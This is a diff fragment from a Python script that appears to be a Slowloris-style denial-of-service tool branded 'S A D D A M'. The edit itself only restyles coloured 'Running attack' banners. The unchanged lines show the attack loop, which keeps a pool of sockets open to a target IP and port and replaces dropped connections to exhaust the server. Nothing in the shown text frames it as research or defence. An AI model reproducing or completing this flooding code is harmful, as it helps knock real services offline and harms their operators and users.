@@ -124,8 +124,8 @@ def main():
     bar.finish()
 
     while True:
-        print("\033[32m—— ".format(len(socket_list)))
-        print("\033[38;5;22m└>  \033[38;5;39m[ S A D D A M ] \033[31m•>\033[33m Running attack \033[38;5;206m" +str(ip)+ " |🇵🇸 \033[0m")
+        print("\033[32m┌[ ".format(len(socket_list)))
+        print("\033[32m└>  \033[38;5;39m[ S A D D A M ] \033[31m•>\033[33m Running attack \033[38;5;206m" +str(ip)+ " |🇵🇸 \033[0m")
         print("\033[38;5;166m└>  \033[96m[ S A D D A M ] \033[34m•>\033[37m Running attack \033[38;5;111m" +str(ip)+ " |🇵🇸\033[0m")
 
         for s in socket_list:
@@ -135,8 +135,8 @@ def main():
                 socket_list.remove(s)
 
         for _ in range(socket_count - len(socket_list)):
-            print("\033[32m—— ".format(len(socket_list)))
-            print("\033[38;5;22m└>  \033[33m[ S A D D A M ] \033[31m•>\033[33m Running attack \033[38;5;206m" +str(ip)+ " |🇵🇸\033[0m")
+            print("\033[32m┌[ ".format(len(socket_list)))
+            print("\033[32m└>  \033[33m[ S A D D A M ] \033[31m•>\033[33m Running attack \033[38;5;206m" +str(ip)+ " |🇵🇸\033[0m")
             print("\033[38;5;166m└>  \033[96m[ S A D D A M ] \033[34m•>\033[37m Running attack \033[38;5;111m" +str(ip)+ " |🇵🇸\033[0m")
             try:
                 s=init_socket(ip,port)
